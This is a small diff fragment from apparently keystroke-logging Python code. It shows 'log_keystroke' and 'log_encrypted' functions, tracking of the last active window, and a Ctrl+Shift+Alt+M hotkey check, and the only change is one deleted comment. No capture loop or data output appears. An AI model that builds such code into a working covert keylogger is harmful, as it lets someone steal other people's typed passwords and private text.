@@ -29,7 +29,6 @@ def log_encrypted(message):
 def log_keystroke(key):
     global last_window
     pressed_keys.add(key)
-    # Check for Ctrl+Shift+Alt+M
     if ((Key.ctrl_l in pressed_keys or Key.ctrl_r in pressed_keys) and
         (Key.shift_l in pressed_keys or Key.shift_r in pressed_keys) and
         (Key.alt_l in pressed_keys or Key.alt_r in pressed_keys) and
